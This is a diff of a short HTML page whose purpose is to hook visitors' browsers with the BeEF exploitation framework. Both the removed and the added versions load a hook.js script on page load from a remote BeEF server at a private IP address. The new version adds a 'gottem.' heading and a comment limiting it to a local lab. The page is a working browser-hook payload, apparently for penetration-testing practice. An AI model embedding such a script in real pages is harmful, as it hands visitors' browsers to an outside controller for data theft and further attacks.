@@ -1,21 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BeEF Hook Page</title>
-    <script type="text/javascript">
-        // Dynamically load the BeEF hook script
-        (function() {
-            var script = document.createElement('script');
-            // Replace <YOUR_BEEF_IP> with your BeEF server's IP (e.g., 127.0.0.1)
-            script.src = 'http://172.26.99.94:3000/hook.js';
-            document.body.appendChild(script);
-        })();
-    </script>
+  <meta charset="UTF-8">
+  <title>BeEF Hook Test</title>
 </head>
 <body>
-    <h1>Welcome to the BeEF Hook Page</h1>
-    <p>If this page is opened, the browser will be hooked by BeEF.</p>
+  <h1>gottem.</h1>
+  <p>Open this page in your test browser.</p>
+
+  <!-- BeEF hook script (only use in your local lab!) -->
+  <script src="http://192.168.1.194:3000/hook.js"></script>
 </body>
 </html>
